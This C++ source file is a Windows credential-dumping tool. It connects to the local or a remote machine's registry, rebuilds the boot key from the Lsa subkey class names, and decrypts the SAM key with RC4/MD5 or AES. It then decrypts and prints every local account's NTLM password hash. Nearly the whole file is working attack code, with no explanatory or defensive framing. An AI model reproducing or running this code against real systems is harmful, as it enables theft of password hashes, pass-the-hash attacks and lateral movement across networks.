#include <Windows.h>
#include <iostream>
#include "md5.h"
#include "reg.h"
#pragma comment(lib,"Advapi32.lib")
#pragma warning(disable:4996)

BYTE qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
BYTE Digits[] = "0123456789012345678901234567890123456789";
BYTE NTPASSWORD[] = "NTPASSWORD";


void desDecrypt(const BYTE *in, const BYTE *key, LPBYTE out);
void rc4Decrypt(CRYPTO_BUFFER *data, CRYPTO_BUFFER *key);

typedef struct _GENERICKEY_BLOB {
	BLOBHEADER Header;
	DWORD dwKeyLen;
} GENERICKEY_BLOB, *PGENERICKEY_BLOB;
void strToHex(CHAR *str) {
	for (int i = 0; i < 8; i++)
	{
		if (str[i] >= 0x30 && str[i] <= 0x39) {
			str[i] = str[i] - 0x30;
		}
		else if (str[i] >= 'a' && str[i] <= 'f') {
			str[i] = str[i] - 'a' + 0xa;
		}
		else if (str[i] >= 'A' && str[i] <= 'F') {
			str[i] = str[i] - 'A' + 0xa;
		}
		else
			return;
	}
}
void getClassInfo(HKEY hkey, char *regName, unsigned char *sysKey, int i) {
	DWORD c = 0x10;
	HKEY hkResult1;
	BYTE classInfo[0x10] = { 0 };
	DWORD status;
	status = RegOpenKeyEx(hkey, regName, 0, KEY_READ, &hkResult1);
	if (status != ERROR_SUCCESS) {
		return;
	}
	RegQueryInfoKey(hkResult1, (LPSTR)classInfo, &c, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	RegCloseKey(hkResult1);
	strToHex((char*)classInfo);
	sysKey[i + 0] = 16 * classInfo[0] + classInfo[1];
	sysKey[i + 1] = 16 * classInfo[2] + classInfo[3];
	sysKey[i + 2] = 16 * classInfo[4] + classInfo[5];
	sysKey[i + 3] = 16 * classInfo[6] + classInfo[7];
}
void getSysKey(char *remoteComputerName, BYTE *bootkey) {
	char reverse[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
	BYTE sysKey[0x10] = { 0 };
	HKEY hkResult;
	BYTE classInfo[0x10] = { 0 };
	DWORD status;
	HKEY hKey;

	status = RegConnectRegistryA(remoteComputerName, HKEY_LOCAL_MACHINE, &hKey);
	if (status != ERROR_SUCCESS) {
		printf("Get SysKey ERROR %d", status);
		exit(1);
	}
	status = RegOpenKeyEx(hKey, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hkResult);
	if (status != ERROR_SUCCESS) {
		exit(1);
	}
	getClassInfo(hkResult, "JD", sysKey, 0);
	getClassInfo(hkResult, "Skew1", sysKey, 4);
	getClassInfo(hkResult, "GBG", sysKey, 8);
	getClassInfo(hkResult, "Data", sysKey, 12);
	RegCloseKey(hkResult);
	RegCloseKey(hKey);
	printf("SysKey: ");
	for (int i = 0; i < 0x10; i++)
	{
		bootkey[i] = sysKey[reverse[i]];
		if (bootkey[i] <= 0xf) {
			printf("0%x", bootkey[i]);
		}
		else {
			printf("%x", bootkey[i]);
		}
	}
	printf("\n");
}

void aesDecrypt(BYTE *Key, BYTE *Data, BYTE *IV, BYTE *outData, DWORD *dwOutLen) {
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	DWORD mode = CRYPT_MODE_CBC;
	PGENERICKEY_BLOB keyBlob;
	DWORD szBlob = sizeof(GENERICKEY_BLOB) + 0x10;
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		if (keyBlob = (PGENERICKEY_BLOB)LocalAlloc(LPTR, szBlob)) {
			keyBlob->Header.bType = PLAINTEXTKEYBLOB;
			keyBlob->Header.bVersion = CUR_BLOB_VERSION;
			keyBlob->Header.reserved = 0;
			keyBlob->Header.aiKeyAlg = CALG_AES_128;
			keyBlob->dwKeyLen = 0x10;
			RtlCopyMemory((PBYTE)keyBlob + sizeof(GENERICKEY_BLOB), Key, keyBlob->dwKeyLen);
			CryptImportKey(hProv, (LPCBYTE)keyBlob, szBlob, 0, 0, &hKey);
			CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE)&mode, 0);
			CryptSetKeyParam(hKey, KP_IV, IV, 0);
			RtlCopyMemory(outData, Data, 0x10);
			CryptDecrypt(hKey, 0, TRUE, 0, outData, dwOutLen);
			LocalFree(keyBlob);
		}
	}
}


void getSamKey(char *remoteComputerName, BYTE *samkey, BYTE *sysKey) {
	HKEY hKey, hkResult;
	PDOMAIN_ACCOUNT_F value;
	DWORD outLen = 0x10;
	DWORD len;
	DWORD status;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER rc4data = { 0x10, 0x10, samkey };
	CRYPTO_BUFFER key = { 0x10, 0x10, md5ctx.digest };
	PSAM_KEY_DATA_AES pAesKey;
	status = RegConnectRegistryA(remoteComputerName, HKEY_LOCAL_MACHINE, &hKey);
	if (status != ERROR_SUCCESS) {
		exit(1);
	}
	status = RegOpenKeyEx(hKey, "SAM\\SAM\\Domains\\Account", 0, KEY_READ, &hkResult);
	if (status != ERROR_SUCCESS) {
		printf("Get SamKey ERROR %d", status);
		exit(1);
	}
	RegQueryValueEx(hkResult, "F", 0, NULL, NULL, &len);
	value = (PDOMAIN_ACCOUNT_F)LocalAlloc(LPTR,len);
	RegQueryValueEx(hkResult, "F", 0, NULL, (PBYTE)value, &len);
	RegCloseKey(hKey);
	RegCloseKey(hkResult);
	printf("SamKey: ");
	switch (value->keys1.Revision)
	{
	case 1:
		
		MD5Init(&md5ctx);
		MD5Update(&md5ctx, value->keys1.Salt, 0x10);
		MD5Update(&md5ctx, qwertyuiopazxc, sizeof(qwertyuiopazxc));
		MD5Update(&md5ctx, sysKey, 0x10);
		MD5Update(&md5ctx, Digits, sizeof(Digits));
		MD5Final(&md5ctx);
		RtlCopyMemory(samkey, value->keys1.Key, 0x10);
		rc4Decrypt(&rc4data, &key);
		break;
	case 2:
		pAesKey = (PSAM_KEY_DATA_AES)&value->keys1;
		aesDecrypt(sysKey, pAesKey->data, pAesKey->Salt, samkey, &outLen);
		break;
	}
	for (int i = 0; i < 0x10; i++) {
		if (samkey[i] <= 0x0f)
			printf("0%x", samkey[i]);
		else
			printf("%x", samkey[i]);
	}
	printf("\n");
	LocalFree(value);
}

void hashDecrypt(BYTE *encHash, CHAR *hexRID) {
	BYTE byteRID[0x4];
	BYTE hash[0X10];
	strToHex(hexRID);
	byteRID[0] = hexRID[6] * 16 + hexRID[7];
	byteRID[1] = hexRID[4] * 16 + hexRID[5];
	byteRID[2] = hexRID[2] * 16 + hexRID[3];
	byteRID[3] = hexRID[0] * 16 + hexRID[1];

	desDecrypt(encHash, byteRID, hash);
	for (int i = 0; i < 0x10; i++) {
		if (hash[i] <= 0xf) {
			printf("0%x", hash[i]);
		}
		else {
			printf("%x", hash[i]);
		}
	}

}
void getHash(char *remoteComputerName, BYTE *samKey) {
	DWORD status;
	HKEY hKey, hkResult;
	DWORD nbSubKeys;
	DWORD szMaxSubKeyLen;
	DWORD szUser;
	char *subKeyName;

	status = RegConnectRegistryA(remoteComputerName, HKEY_LOCAL_MACHINE, &hKey);
	if (status != ERROR_SUCCESS) {
		exit(1);
	}
	status = RegOpenKeyEx(hKey, "SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hkResult);
	if (status != ERROR_SUCCESS) {
		printf("Get Hash ERROR %d", status);
		exit(1);
	}
	RegQueryInfoKey(hkResult, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);
	szMaxSubKeyLen++;
	subKeyName = (char*)LocalAlloc(LPTR,0x09);
	for (int i = 0; i < nbSubKeys - 1; i++) {
		HKEY hkResult1;
		DWORD outLen = 0x10;
		DWORD ntLen = 0;
		DWORD regLength = 0;
		DWORD rid = 0;
		PUSER_ACCOUNT_V value;
		BYTE key[0x04];
		MD5_CTX md5ctx;
		CRYPTO_BUFFER  cypheredHashBuffer = { 0x10, 0x10, NULL }, keyBuffer = { 0x10, 0x10, md5ctx.digest };

		szUser = szMaxSubKeyLen;
		RegEnumKeyEx(hkResult, i, subKeyName, &szUser, NULL, NULL, NULL, NULL);
		sscanf_s(subKeyName, "%x", &rid);
		
		RegOpenKeyEx(hkResult, subKeyName, 0, KEY_READ, &hkResult1);
		RegQueryValueEx(hkResult1, "V", 0, NULL, NULL, &regLength);
		value = (PUSER_ACCOUNT_V)LocalAlloc(LPTR,regLength);
		RegQueryValueEx(hkResult1, "V", 0, NULL, (PBYTE)value, &regLength);
		PSAM_HASH pHash = (PSAM_HASH)(value->datas + value->NTLMHash.offset);
		for (int i = 0; i < value->Username.lenght; i++) {
			if ((value->datas + value->Username.offset)[i] != 0) {
				printf("%c", (value->datas + value->Username.offset)[i]);
			}
		}
		printf("(%d):", rid);
		strToHex(subKeyName);
		key[0] = subKeyName[6] * 16 + subKeyName[7];
		key[1] = subKeyName[4] * 16 + subKeyName[5];
		key[2] = subKeyName[2] * 16 + subKeyName[3];
		key[3] = subKeyName[0] * 16 + subKeyName[1];
		switch (pHash->Revision)
		{
		case 1:
			if (value->NTLMHash.lenght >= sizeof(SAM_HASH)) {
				cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, 0x10);
				RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, 0x10);
				MD5Init(&md5ctx);
				MD5Update(&md5ctx, samKey, 0x10);
				MD5Update(&md5ctx, key, 0x04);
				MD5Update(&md5ctx, NTPASSWORD, sizeof(NTPASSWORD));
				MD5Final(&md5ctx);
				rc4Decrypt(&cypheredHashBuffer, &keyBuffer);
				hashDecrypt(cypheredHashBuffer.Buffer, subKeyName);
			}
			else
				printf("NULL");
			break;
		case 2:
			PSAM_HASH_AES pHashAes;
			pHashAes = (PSAM_HASH_AES)pHash;
			if (pHashAes->dataOffset >= 0x10) {
				cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, 0x10);
				aesDecrypt(samKey, pHashAes->data, pHashAes->Salt, cypheredHashBuffer.Buffer, &outLen);
				hashDecrypt(cypheredHashBuffer.Buffer, subKeyName);
			}
			else
				printf("NULL");
			break;
		}
		LocalFree(value);
		printf("\n");
		RegCloseKey(hkResult1);
	}
	LocalFree(subKeyName);
	RegCloseKey(hkResult);
	RegCloseKey(hKey);
}

int main(int argc, char* argv[]) {
	BYTE SysKey[0x10] = { 0 };
	BYTE SamKey[0x10] = { 0 };

	char *remoteComputerName = "";
	if (argc != 1) {
		remoteComputerName = argv[1];
	}
	getSysKey(remoteComputerName, SysKey);
	getSamKey(remoteComputerName, SamKey, SysKey);
	getHash(remoteComputerName, SamKey);
	printf("Done");
	return 0;
}
